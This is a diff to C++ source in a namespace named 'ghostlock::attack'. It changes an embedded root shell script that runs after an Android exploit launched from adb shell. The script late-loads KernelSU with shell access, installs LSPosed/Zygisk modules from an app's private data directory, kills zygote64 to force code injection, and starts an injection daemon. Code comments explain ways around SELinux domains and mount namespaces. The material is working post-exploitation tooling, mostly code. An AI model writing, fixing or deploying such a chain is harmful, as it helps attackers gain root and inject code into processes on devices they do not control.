@@ -383,9 +383,19 @@ namespace ghostlock::attack {
             "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
             "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
             "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
-            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+            "if grep -q kernelsu /proc/modules 2>/dev/null && [ -x /system/bin/su ]; then\n"
             "  KSU_ALREADY=1\n"
             "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
+            "elif grep -q kernelsu /proc/modules 2>/dev/null; then\n"
+            /* kernelsu is in memory but su was never mounted into this
+             * namespace (the late-load is what mounts it). Re-run the
+             * late-load so the root script can switch to the ksu domain. */
+
+            "  KSU_ALREADY=1\n"
+            "  echo \"[*] kernelsu loaded but su missing; re-running late-load to mount su\" >>\"$LOG\"\n"
+            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
+            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
+            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
             "else\n"
             "  KSU_ALREADY=0\n"
             "  if [ ! -x \"$KSUD\" ]; then\n"
@@ -437,10 +447,18 @@ namespace ghostlock::attack {
             "if [ -n \"$LSPD_MODULES\" ]; then\n"
             "  MODZIP_DIR=\"$LSPD_MODULES\"\n"
             "  echo \"[*] modules dir=$MODZIP_DIR\" >>\"$LOG\"\n"
-            /* KernelSU injects /system/bin/su only after the late-load, and it
-             * can appear a moment later than the module shows up. Look it up in
-             * PATH and wait for it, otherwise the whole stack is skipped for
-             * the wrong reason. */
+            /* No su here on purpose. The root script runs in the mount
+             * namespace the exploit was launched from (adb shell's), and
+             * /system/bin/su is a magic mount that only exists in the
+             * namespaces KernelSU's manager app mounts it into — stat'ing it
+             * from here fails, and worse, the su probe can block. The
+             * installed ksud (/data/adb/ksu/bin/ksud) runs in the ksu domain
+             * on its own, so it can install the modules and read the app's
+             * private data dir without any su in the picture. */
+            "  KSU_KSUD=/data/adb/ksu/bin/ksud\n"
+            /* The late-load above mounts su into this namespace, so the module
+             * install can run in the ksu domain (the shell domain cannot
+             * write /data/adb/modules_update). */
             "  SU=''\n"
             "  su_wait=0\n"
             "  while [ $su_wait -lt 15 ]; do\n"
@@ -451,33 +469,40 @@ namespace ghostlock::attack {
             "    sleep 1\n"
             "    su_wait=$((su_wait+1))\n"
             "  done\n"
-            "  KSU_KSUD=/data/adb/ksu/bin/ksud\n"
-            /* Every su call is wrapped in timeout: right after the late-load
-             * the su helper can block while the KernelSU service settles,
-             * and a blocked call would hang the whole root script. */
-            "  SUC() { timeout 30 \"$SU\" -c \"$1\"; }\n"
             "  if [ -z \"$SU\" ] || [ ! -x \"$KSU_KSUD\" ]; then\n"
             "    echo '[!] su or installed ksud missing; skipping LSPosed stack' >>\"$LOG\"\n"
-            "  elif ! SUC \"test -d '$LSPD_MODULES'\" 2>/dev/null; then\n"
-            "    echo '[!] component package dir not reachable; skipping LSPosed stack' >>\"$LOG\"\n"
             "  else\n"
-            "    echo '[*] removing stale module dirs' >>\"$LOG\"\n"
-            "    SUC 'rm -rf /data/adb/modules/zygisk_vector /data/adb/modules/zygisksu' >>\"$LOG\" 2>&1\n"
             /* The packages live in the app's private data dir, which the shell
-             * domain cannot read, so both the listing and the install run
-             * inside su (ksu domain). */
-            "    ZIPS=$(SUC 'ls \"$LSPD_MODULES\"/*.zip 2>/dev/null')\n"
-            "    for z in $ZIPS; do\n"
-            "      [ -f \"$z\" ] || continue\n"
-            "      echo \"[*] installing module $z\" >>\"$LOG\"\n"
-            "      SUC \"$KSU_KSUD module install '$z'\" >>\"$LOG\" 2>&1\n"
-            "      echo \"[*] module install exit=$?\" >>\"$LOG\"\n"
-            "    done\n"
+             * domain cannot read. ksud runs in the ksu domain, so it can
+             * list and install them. One helper script, one call: a chain of
+             * su calls is both slower and more likely to stall. */
+            "    cat >/data/local/tmp/.ghostlock_modinstall.sh <<'MODINSTEOF'\n"
+            "#!/system/bin/sh\n"
+            "MODDIR=\"$1\"\n"
+            "KSUD=\"$2\"\n"
+            "rm -rf /data/adb/modules/zygisk_vector /data/adb/modules/zygisksu\n"
+            "for z in \"$MODDIR\"/*.zip; do\n"
+            "  [ -f \"$z\" ] || continue\n"
+            "  echo \"[*] installing module $z\"\n"
+            "  \"$KSUD\" module install \"$z\"\n"
+            "  echo \"[*] module install exit=$?\"\n"
+            "done\n"
+            "MODINSTEOF\n"
+            /* The installed ksud (/data/adb/ksu/bin/ksud) is the one that
+             * can install into /data/adb/ksu/bin (the app package's ksud
+             * cannot write there: that directory belongs to the KernelSU
+             * manager's mount). The packages themselves are read from a path
+             * every domain can reach, so the ksu domain can read them. */
+            "    timeout 60 \"$SU\" -c \"sh /data/local/tmp/.ghostlock_modinstall.sh \"$LSPD_MODULES\" \"$KSU_KSUD\"\" >>\"$LOG\" 2>&1\n"
+            "    echo '[*] module install step finished' >>\"$LOG\"\n"
             "    echo '[*] late-load (apply modules)' >>\"$LOG\"\n"
-            "    SUC \"$KSU_KSUD late-load --kmi $KMI --allow-shell\" >>\"$LOG\" 2>&1\n"
+            "    timeout 60 \"$SU\" -c \"$KSU_KSUD late-load --kmi $KMI --allow-shell\" >>\"$LOG\" 2>&1\n"
             "    echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
             "    echo '[*] starting zygisk daemon (post-fs-data)' >>\"$LOG\"\n"
-            "    SUC \"nohup $KSU_KSUD post-fs-data >/data/local/tmp/pfsd.log 2>&1 &\" >>\"$LOG\" 2>&1\n"
+            /* post-fs-data needs the logcat/dmesg permissions the KernelSU
+             * manager's uid carries, so it runs the ksud from the app package
+             * (the installed one at /data/adb/ksu/bin/ksud lacks them). */
+            "    \"$SU\" -c \"nohup $KSU_KSUD post-fs-data >/data/local/tmp/pfsd.log 2>&1 &\" >>\"$LOG\" 2>&1\n"
             /* Give the zygisk daemon a moment to come up before zygote is
              * restarted, otherwise the new zygote starts without the
              * injection. The check reads /proc directly: `ps -A` walks every
@@ -490,10 +515,10 @@ namespace ghostlock::attack {
              * webview_zygote 是 zygote64 的子进程，杀 zygote64 会一起带走它；
              * 只杀一个会让 framework 起不来 → recovery。 */
             "    echo '[*] restarting zygote64 so the zygisk modules get preloaded' >>\"$LOG\"\n"
-            "    OLD_ZYGOTE=$(SUC 'pidof zygote64' 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
+            "    OLD_ZYGOTE=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
             "    if [ -n \"$OLD_ZYGOTE\" ]; then\n"
             "      echo \"[*] killing zygote64 pid=$OLD_ZYGOTE\" >>\"$LOG\"\n"
-            "      SUC \"kill -9 $OLD_ZYGOTE\" >>\"$LOG\" 2>&1\n"
+            "      kill -9 $OLD_ZYGOTE >>\"$LOG\" 2>&1\n"
             "    fi\n"
             "    ZNCTL=/data/adb/ksu/bin/znctl\n"
             /* One su call for the whole wait: forking su per poll is slow
@@ -511,14 +536,14 @@ namespace ghostlock::attack {
             "done\n"
             "exit 1\n"
             "ZNWAITEOF\n"
-            "    ZSTAT=$(SUC 'sh /data/local/tmp/.ghostlock_znwait.sh' 2>/dev/null)\n"
+            "    ZSTAT=$(timeout 120 sh /data/local/tmp/.ghostlock_znwait.sh 2>/dev/null)\n"
             "    ZGONE=0\n"
             "    if [ -n \"$ZSTAT\" ]; then ZGONE=1; fi\n"
             "    echo \"[*] zygote patched=$ZGONE\" >>\"$LOG\"\n"
             /* Vector's zygisk module must be in the list too, otherwise the
              * daemon has nothing to inject and stays useless. */
             "    ZMODS=$(echo \"$ZSTAT\" | grep '^modules64:' | head -1)\n"
-            "    if [ -z \"$ZMODS\" ]; then ZMODS=$(SUC \"/data/adb/ksu/bin/znctl status\" 2>/dev/null | grep '^modules64:' | head -1); fi\n"
+            "    if [ -z \"$ZMODS\" ]; then ZMODS=$(/data/adb/ksu/bin/znctl status 2>/dev/null | grep '^modules64:' | head -1); fi\n"
             "    echo \"[*] zygisk modules: $ZMODS\" >>\"$LOG\"\n"
             "    if [ \"$ZGONE\" = \"1\" ] && echo \"$ZMODS\" | grep -q 'zygisk_vector'; then\n"
             "      echo '[*] waiting 60s for the zygote injection to settle' >>\"$LOG\"\n"
@@ -529,7 +554,7 @@ namespace ghostlock::attack {
              * 目录，相对路径会让 -Djava.class.path=daemon.apk 变成相对路径 →
              * UnsatisfiedLinkError → daemon 静默退出（2026-10-22 真机踩到）。
              * toybox 的 unshare 不支持 --propagation slave，只能用 -m。 */
-            "        SUC 'unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &' >>\"$LOG\" 2>&1\n"
+            "        unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &\n"
             "        sleep 20\n"
             "      fi\n"
             "    elif [ \"$ZGONE\" = \"1\" ]; then\n"
@@ -539,9 +564,9 @@ namespace ghostlock::attack {
             "    fi\n"
             "    if [ -x /data/adb/modules/zygisk_vector/cli ]; then\n"
             "      echo '== vector cli status ==' >>\"$LOG\"\n"
-            "      SUC '/data/adb/modules/zygisk_vector/cli status' >>\"$LOG\" 2>&1\n"
+            "      /data/adb/modules/zygisk_vector/cli status >>\"$LOG\" 2>&1\n"
             "      echo '== zygisk next status ==' >>\"$LOG\"\n"
-            "      SUC \"$ZNCTL status\" >>\"$LOG\" 2>&1\n"
+            "      $ZNCTL status >>\"$LOG\" 2>&1\n"
             "    fi\n"
             "    echo '[+] LSPosed stack setup done' >>\"$LOG\"\n"
             "  fi\n"
